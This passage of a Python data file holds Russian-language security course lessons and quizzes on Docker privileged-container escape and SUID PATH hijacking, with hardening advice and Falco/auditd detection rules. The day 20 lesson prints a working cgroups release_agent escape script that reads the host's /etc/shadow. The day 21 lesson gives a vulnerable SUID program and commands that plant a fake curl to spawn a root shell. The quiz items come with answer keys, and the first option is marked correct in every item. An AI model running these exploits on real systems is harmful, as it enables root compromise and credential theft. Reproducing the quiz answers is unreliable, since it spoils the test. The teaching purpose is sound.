                "correct": 0,
                "explain": "Запись ключа в authorized_keys хоста дает атакующему персистентный рутовый SSH-доступ к серверу."
            },
            {
                "id": "d19_q8",
                "day": 19,
                "q": "Что делает инструмент Docker Socket Proxy (например, от Tecnativa)?",
                "options": [
                    "Фильтрует запросы к Docker API, запрещая деструктивные эндпоинты создания контейнеров и разрешая только безопасное чтение",
                    "Шифрует файлы на диске",
                    "Ускоряет загрузку образов",
                    "Блокирует порт 22"
                ],
                "correct": 0,
                "explain": "Socket Proxy блокирует POST/DELETE к критическим эндпоинтам, позволяя мониторингу безопасно собирать метрики."
            },
            {
                "id": "d19_q9",
                "day": 19,
                "q": "Какой код ответа вернет Docker API при успешном создании контейнера через REST-запрос к /containers/create?",
                "options": ["HTTP 201 Created", "HTTP 404 Not Found", "HTTP 500 Error", "HTTP 302 Found"],
                "correct": 0,
                "explain": "По спецификации Docker Engine API успешное создание сущности контейнера возвращает HTTP 201 Created."
            }
        ]
    },

    # =========================================================================
    # DAY 20: Флаг --privileged и побег через cgroups release_agent
    # =========================================================================
    {
        "day": 20,
        "title": "День 20: Флаг --privileged и cgroups release_agent",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "Breakout",
        "theory": """<h3>⚡ 1. Опасности флага --privileged</h3>
<p>Запуск контейнера с флагом <code>docker run --privileged</code> практически полностью аннулирует изоляцию:</p>
<ul>
<li>Отключается профиль фильтрации системных вызовов Seccomp.</li>
<li>Отключается профиль мандатного доступа AppArmor.</li>
<li>Контейнеру выдаются абсолютно ВСЕ capabilities (включая <code>CAP_SYS_ADMIN</code>).</li>
<li>Контейнер получает доступ ко всем аппаратным дискам и устройствам хоста в <code>/dev</code> (sda, nvme, mem).</li>
</ul>

<h3>💥 2. Реализация атаки: Побег через cgroups v1 release_agent</h3>
<p>В подсистеме Cgroups v1 существует функция <code>release_agent</code>: когда в контрольной группе завершается последний процесс, ядро хоста автоматически запускает скрипт, прописанный в файле <code>release_agent</code>, <b>с правами root на самом хосте</b>!</p>

<div class='code-box'># Эксплойт побега из Privileged контейнера (Felix Wilhelm PoC):
# 1. Монтируем контроллер памяти cgroups:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Включаем уведомления об освобождении процессов:
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Находим путь к нашей файловой системе на хосте:
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)

# 4. Создаем скрипт атаки внутри контейнера:
echo "#!/bin/sh" > /cmd
echo "ps aux > $host_path/output" >> /cmd
echo "cat /etc/shadow >> $host_path/output" >> /cmd
chmod a+x /cmd

# 5. Прописываем путь к нашему скрипту в release_agent ядра хоста:
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 6. Триггерим запуск: создаем пустой процесс и сразу завершаем его:
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"

# 7. Читаем результат работы рутового скрипта хоста:
cat /output</div>

<h3>🛡️ 3. Инженерная защита</h3>
<p>1. <b>Категорический запрет --privileged:</b> Если требуются отдельные права, выдавать только точечные флаги (например, <code>--cap-add=NET_ADMIN</code>).<br>
2. <b>Переход на Cgroups v2:</b> В Cgroups v2 механизм <code>release_agent</code> удален из соображений безопасности.<br>
3. <b>Защитный флаг:</b> <code>--security-opt no-new-privileges:true</code>.</p>

<h3>🔍 4. Детектирование в SIEM</h3>
<p>Правило Falco на детектирование монтирования cgroups внутри контейнера:</p>
<div class='code-box'>- rule: Mount Cgroup Inside Container
  condition: container and evt.type = mount and evt.arg.type = "cgroup"
  output: "Potential Container Escape: Cgroup mounted inside container"
  priority: CRITICAL</div>""",
        "questions": [
            {
                "id": "d20_q1",
                "day": 20,
                "q": "Что происходит с изоляцией контейнера при указании флага --privileged в docker run?",
                "options": [
                    "Отключаются Seccomp и AppArmor, выдаются все Capabilities и доступ ко всем физическим дискам хоста в /dev",
                    "Контейнер шифруется паролем",
                    "Увеличивается объем оперативной памяти",
                    "Контейнер изолируется в два раза сильнее"
                ],
                "correct": 0,
                "explain": "Флаг --privileged фактически снимает все защитные механизмы ядра, оставляя хост беззащитным перед побегом."
            },
            {
                "id": "d20_q2",
                "day": 20,
                "q": "От чьего имени ядро Linux исполняет скрипт, указанный в файле cgroups release_agent?",
                "options": [
                    "От имени суперпользователя root на хостовой операционной системе вне контейнера",
                    "От имени гостя",
                    "От имени непривилегированного пользователя контейнера",
                    "Скрипт не исполняется"
                ],
                "correct": 0,
                "explain": "Механизм release_agent вызывается ядром хоста напрямую с наивысшими правами ядра."
            },
            {
                "id": "d20_q3",
                "day": 20,
                "q": "Почему в современных дистрибутивах переход на Cgroups v2 повысил безопасность контейнеров?",
                "options": [
                    "В Cgroups v2 уязвимый механизм release_agent был полностью удален и заменен на безопасный API уведомлений cgroup.events",
                    "Cgroups v2 шифрует память",
                    "Cgroups v2 запрещает запуск Docker",
                    "Cgroups v2 работает без ядра"
                ],
                "correct": 0,
                "explain": "В архитектуре Cgroups v2 опасный механизм выполнения произвольных бинарников ядром был упразднен."
            },
            {
                "id": "d20_q4",
                "day": 20,
                "q": "Как атакующий в Privileged-контейнере может получить доступ к жесткому диску хоста без эксплойтов?",
                "options": [
                    "Выполнить команду mount /dev/sda1 /mnt, так как все блочные устройства хоста доступны в каталоге /dev",
                    "Перезагрузить роутер",
                    "Отправить ping",
                    "Открыть порт 80"
                ],
                "correct": 0,
                "explain": "В привилегированном режиме контейнер видит /dev/sda и может напрямую смонтировать файловую систему хоста."
            },
            {
                "id": "d20_q5",
                "day": 20,
                "q": "Какая Capability необходима контейнеру для монтирования файловой системы cgroups?",
                "options": ["CAP_SYS_ADMIN", "CAP_NET_RAW", "CAP_CHOWN", "CAP_KILL"],
                "correct": 0,
                "explain": "Операция mount() жестко требует наличия привилегии CAP_SYS_ADMIN."
            },
            {
                "id": "d20_q6",
                "day": 20,
                "q": "Что делает команда echo 1 > /tmp/cgrp/x/notify_on_release в эксплойте?",
                "options": [
                    "Взводит триггер вызова скрипта release_agent в момент завершения последнего процесса контрольной группы",
                    "Удаляет файлы логов",
                    "Включает Wi-Fi",
                    "Блокирует процессор"
                ],
                "correct": 0,
                "explain": "Параметр notify_on_release указывает ядру вызвать скрипт очистки при опустошении cgroups."
            },
            {
                "id": "d20_q7",
                "day": 20,
                "q": "Как правильно выдать контейнеру только сетевые привилегии без использования флага --privileged?",
                "options": ["docker run --cap-add=NET_ADMIN ...", "docker run --privileged", "chmod 777", "sudo su"],
                "correct": 0,
                "explain": "Флаг --cap-add позволяет точечно предоставить одну конкретную возможность по принципу наименьших привилегий."
            },
            {
                "id": "d20_q8",
                "day": 20,
                "q": "Какое правило EDR/Falco детектирует попытку побега через release_agent?",
                "options": [
                    "Запись в файл с именем *release_agent* внутри контейнера",
                    "Запрос к Google",
                    "Скачивание файла по HTTP",
                    "Создание файла readme.txt"
                ],
                "correct": 0,
                "explain": "Попытка записи в файл release_agent из пространства контейнера является явным признаком эксплойта побега."
            },
            {
                "id": "d20_q9",
                "day": 20,
                "q": "Какой флаг запрещает повышение привилегий в docker run даже при наличии уязвимостей?",
                "options": [
                    "--security-opt no-new-privileges:true",
                    "--restart=always",
                    "--memory=512m",
                    "--name=test"
                ],
                "correct": 0,
                "explain": "Опция no-new-privileges блокирует эскалацию прав через SUID и capabilities внутри контейнера."
            }
        ]
    },

    # =========================================================================
    # DAY 21: SUID, glibc AT_SECURE и PATH Hijacking
    # =========================================================================
    {
        "day": 21,
        "title": "День 21: SUID, glibc AT_SECURE и PATH Hijacking",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "T1548.001",
        "theory": """<h3>⚡ 1. Механика SUID и защита динамического линковщика</h3>
<p>Бит <b>SUID (Set User ID, chmod u+s)</b> указывает ядру запускать бинарник с правами <b>владельца файла (EUID = owner)</b>, а не запустившего его пользователя.</p>
<p><b>Почему не работает подмена библиотек через LD_PRELOAD?</b><br>
При загрузке ELF-бинарника динамический компоновщик <code>glibc ld.so</code> проверяет флаг ядра <b><code>AT_SECURE</code></b> в векторе auxv.
Если <code>RUID != EUID</code> (запущен чужой SUID-файл), линковщик принудительно <b>игнорирует все опасные переменные окружения</b>:
<code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, <code>MALLOC_CHECK_</code>. Это базовая аппаратная защита glibc.</p>

<h3>💥 2. Реализация атаки: PATH Hijacking</h3>
<p>Если разработчик SUID-программы использует небезопасный вызов <code>system()</code> или <code>popen()</code> с <b>относительным путем</b>:</p>
<div class='code-box'>// Уязвимый исходный код C бинарника (/usr/local/bin/backup):
int main() {
    setuid(0);
    system("curl -s http://internal/ping"); // ОШИБКА! Нет абсолютного пути /usr/bin/curl!
    return 0;
}</div>

<p><b>Пошаговый сценарий эксплуатации:</b></p>
<ol>
<li>Атакующий создает в каталоге <code>/tmp</code> вредоносный скрипт с именем <code>curl</code>:
    <div class='code-box'>echo -e '#!/bin/sh\\n/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl</div>
</li>
<li>Модифицирует системную переменную <code>$PATH</code>, поместив <code>/tmp</code> на первое место:
    <div class='code-box'>export PATH=/tmp:$PATH</div>
</li>
<li>Запускает SUID-бинарник <code>/usr/local/bin/backup</code>.</li>
<li>Функция <code>system()</code> запускает шелл <code>sh -c "curl ..."</code>. Шелл ищет <code>curl</code> по путям из переменной <code>$PATH</code>, первым находит <code>/tmp/curl</code> и исполняет шелл атакующего с правами <b>root</b>!</li>
</ol>

<h3>🛡️ 3. Инженерная защита: Безопасные функции execve()</h3>
<p>1. Использовать абсолютные пути к исполняемым файлам: <code>/usr/bin/curl</code>.<br>
2. Отказаться от функции <code>system()</code> в пользу семейства <code>execv()</code> без интерпретатора оболочки:</p>
<div class='code-box'>char *args[] = {"/usr/bin/curl", "-s", "http://internal/ping", NULL};
execv(args[0], args); // Переменная PATH полностью игнорируется!</div>

<h3>🔍 4. Детектирование в SOC / auditd</h3>
<p>Правило auditd на запуск любых бинарников из каталогов <code>/tmp</code> и <code>/dev/shm</code>:</p>
<div class='code-box'>-a always,exit -F arch=b64 -F dir=/tmp -F perm=x -k execution_from_tmp</div>""",
        "questions": [
            {
                "id": "d21_q1",
                "day": 21,
                "q": "Почему переменная окружения LD_PRELOAD игнорируется системой при запуске SUID-бинарников?",
                "options": [
                    "Динамический линковщик glibc при активном флаге ядра AT_SECURE (когда RUID != EUID) принудительно очищает опасные переменные окружения",
                    "SUID бинарники не используют динамические библиотеки",
                    "LD_PRELOAD работает только в Windows",
                    "Ядро Linux блокирует чтение файлов"
                ],
                "correct": 0,
                "explain": "Механизм AT_SECURE в glibc защищает привилегированные процессы от инъекции произвольных библиотек через переменные среды."
            },
            {
                "id": "d21_q2",
                "day": 21,
                "q": "В чем заключается фундаментальная ошибка разработчика, делающая возможной атаку PATH Hijacking?",
                "options": [
                    "Вызов системной команды через функцию system() без указания полного абсолютного пути к бинарнику (/usr/bin/curl)",
                    "Использование языка C вместо Python",
                    "Установка прав 755",
                    "Использование шифрования"
                ],
                "correct": 0,
                "explain": "Относительный вызов заставляет командный интерпретатор искать бинарник по каталогам, заданным в пользовательской переменной $PATH."
            },
            {
                "id": "d21_q3",
                "day": 21,
                "q": "Какая команда находит все файлы с установленным битом SUID на сервере Linux?",
                "options": [
                    "find / -perm -4000 -type f 2>/dev/null",
                    "ls -la /",
                    "grep -r SUID /",
                    "cat /etc/suid"
                ],
                "correct": 0,
                "explain": "Маска прав -4000 в утилите find ищет файлы с активным 12-м битом режима доступа (SUID)."
            },
            {
                "id": "d21_q4",
                "day": 21,
                "q": "Какая функция вместо system() должна использоваться для безопасного запуска процессов без участия шелла?",
                "options": ["execv() с абсолютным путем", "popen()", "system_safe()", "eval()"],
                "correct": 0,
                "explain": "Семейство execv/execve принимает прямой путь к файлу и массив аргументов, не запуская командную оболочку sh."
            },
            {
                "id": "d21_q5",
                "day": 21,
                "q": "Что означает флаг '-p' при вызове bash в эксплойте (/bin/bash -p)?",
                "options": [
                    "Привилегированный режим: bash сохраняет права EUID (root) и не сбрасывает их обратно в RUID",
                    "Печать версии bash",
                    "Пассивный режим",
                    "Проверка синтаксиса"
                ],
                "correct": 0,
                "explain": "По умолчанию bash при обнаружении RUID != EUID сбрасывает EUID к обычному пользователю. Флаг -p отключает этот сброс."
            },
            {
                "id": "d21_q6",
                "day": 21,
                "q": "Какой популярный онлайн-ресурс каталогизирует легитимные бинарники Linux для повышения привилегий через SUID?",
                "options": ["GTFOBins", "GitHub", "Exploit-DB", "StackOverflow"],
                "correct": 0,
                "explain": "GTFOBins — авторитетный каталог способов побега из шелла и повышения привилегий через штатные утилиты Unix."
            },
            {
                "id": "d21_q7",
                "day": 21,
                "q": "Какой бит прав доступа отвечает за SGID (выполнение с правами группы)?",
                "options": ["2000 (chmod g+s)", "4000", "1000", "0777"],
                "correct": 0,
                "explain": "Восьмеричное значение 2000 устанавливает бит SGID, а 4000 — SUID."
            },
            {
                "id": "d21_q8",
                "day": 21,
                "q": "Какая опция монтирования файловой системы запрещает исполнение SUID-бинарников в каталоге /tmp?",
                "options": ["nosuid", "noexec", "ro", "nodev"],
                "correct": 0,
                "explain": "Флаг nosuid при монтировании раздела (например, /tmp) указывает ядру игнорировать биты SUID/SGID на файлах этого раздела."
            },
            {
                "id": "d21_q9",
                "day": 21,
                "q": "Что произойдет, если непривилегированный пользователь отредактирует SUID-файл текстовым редактором?",
                "options": [
                    "При перезаписи файла ядро Linux автоматически снимет бит SUID из соображений безопасности",
                    "Файл станет доступен всем",
                    "Ядро выдаст права root пользователю",
                    "Система перезагрузится"
                ],
                "correct": 0,
                "explain": "Ядро Linux автоматически очищает биты SUID и SGID при модификации файла непривилегированным пользователем."
            }
        ]
    }
]
